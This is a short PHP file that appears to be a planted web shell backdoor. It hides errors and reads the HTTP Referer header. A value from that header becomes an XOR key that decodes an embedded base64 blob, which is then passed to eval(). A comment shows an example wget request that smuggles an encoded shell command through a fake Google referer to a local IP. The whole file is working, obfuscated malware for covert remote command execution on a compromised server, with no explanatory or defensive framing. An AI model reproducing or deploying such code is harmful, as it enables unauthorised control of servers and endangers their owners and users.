<?php
	//wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=`echo -n "ls -alh;" | perl -e 'use MIME::Base64 qw(encode_base64);print encode_base64();'`&asdsad=0" http://192.168.1.102/ -O - -q
	@error_reporting(0);	
	$ref=explode('?', $_SERVER['HTTP_REFERER']);
	parse_str($ref[1], $ref);
	$ref=array_values($ref);
	$text = base64_decode('J2Zoclc9TSMpLXZtf3U1IFJwaW9/Z3ElMH5pdlglUD03f2dqYG58JChiZnJWJlEla2B1fnEsPCojNH5tf3h1bjwpZmlqSzJJIzYsPi4lJS89NyxycXFsfzdvcXBxLSU2LDAnd2BwLDEwZmx9eGNodSszLTMgKGJmclYlUSUrI3FufGMsMkFteXEsaH90emF7bWh1Zy4tNiJqeW9xUmR5eE9ge2NgaWJkcDwpd2FoSzJJIXJlYHVcc2hgU29/bWBoenh/OCd3YHBXPE0qPSM2UGIyODRvZmltezh3bGdpLCI5NC1UaXpxbzwpZmlqSzJJJC8sbmJmdWYvcSw=');		
	@eval((($text ^ @str_pad("", strlen($text), $ref[0])) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text))));
?>
